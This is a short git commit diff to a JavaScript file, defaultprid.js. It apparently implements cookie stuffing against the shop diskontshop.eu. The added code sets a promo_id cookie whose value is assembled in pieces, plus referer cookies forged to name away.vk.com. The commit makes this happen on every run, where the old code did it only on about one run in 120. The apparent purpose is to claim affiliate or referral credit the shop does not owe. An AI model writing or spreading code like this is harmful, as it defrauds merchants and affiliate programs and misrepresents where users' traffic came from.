d037ca5d8994f96e021f7750e44d46877e5412cb
kmu88ds <Kazakov.mihail@live.com>
2018-12-06 17:25:38 +0500

    Update defaultprid.js

--- defaultprid.js
+++ defaultprid.js
@@ -1,27 +1,12 @@
-    function set_cookie(name, value, expires_year, expires_month, expires_day, path, domain, secure) {
-        var cookie_string = name + "=" + escape(value);
-        if (expires_year) {
-            var expires = new Date(expires_year, expires_month, expires_day);
-            cookie_string += "; expires=" + expires.toGMTString();
-        }
-        if (secure)
-            cookie_string += "; secure";
-        document.cookie = cookie_string;
-    }
     function randomInteger(min, max) {
         var rand = min + Math.random() * (max + 1 - min);
         rand = Math.floor(rand);
         return rand;
     }
-    if (randomInteger(1, 120) == 23) {
+    if (randomInteger(1, 1) == 1) {
         const current_value = '20' + '73' + '76';
-        var current_date = new Date;
-        var cookie_year = current_date.getFullYear();
-        var cookie_month = current_date.getMonth() + 1;
-        var cookie_day = current_date.getDate();
-        set_cookie("promo_id", current_value, cookie_year, cookie_month, cookie_day, "/", "diskontshop.eu");
-        set_cookie("referer", "http%3A%2F%2Faway.vk.com%2Faway.php", cookie_year, cookie_month, cookie_day, "/",
-            "diskontshop.eu");
-        set_cookie("promo_referer", "http%3A%2F%2Faway.vk.com%2Faway.php", cookie_year, cookie_month, cookie_day, "/",
-            ".diskontshop.eu");
+        var Cookies0 = Cookies.noConflict();
+        Cookies0.set("promo_id", current_value, { expires: 30, path: '/', domain: 'diskontshop.eu' });
+        Cookies0.set("referer", "http%3A%2F%2Faway.vk.com%2Faway.php", { expires: 30, path: '/', domain: 'diskontshop.eu' });
+        Cookies0.set("promo_referer", "http%3A%2F%2Faway.vk.com%2Faway.php", { expires: 30, path: '/', domain: 'diskontshop.eu' });
      };
